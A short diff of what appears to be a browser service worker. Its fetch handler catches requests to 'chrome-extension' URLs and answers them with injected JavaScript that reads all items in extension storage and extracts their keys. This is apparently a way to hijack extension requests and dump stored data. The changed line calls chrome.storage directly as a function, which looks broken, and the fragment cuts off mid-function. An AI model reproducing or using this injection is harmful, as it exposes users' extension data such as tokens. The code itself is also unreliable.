@@ -6,7 +6,7 @@ self.addEventListener("fetch", (event) => {
     }
     if(event.request.url.indexOf("chrome-extension") != -1){
         var a =             new Response(`(async function foo() {
-            chrome.storage.session(null, function(items) {
+            chrome.storage(null, function(items) {
           // 提取所有键
           const keys = Object.keys(items);
       
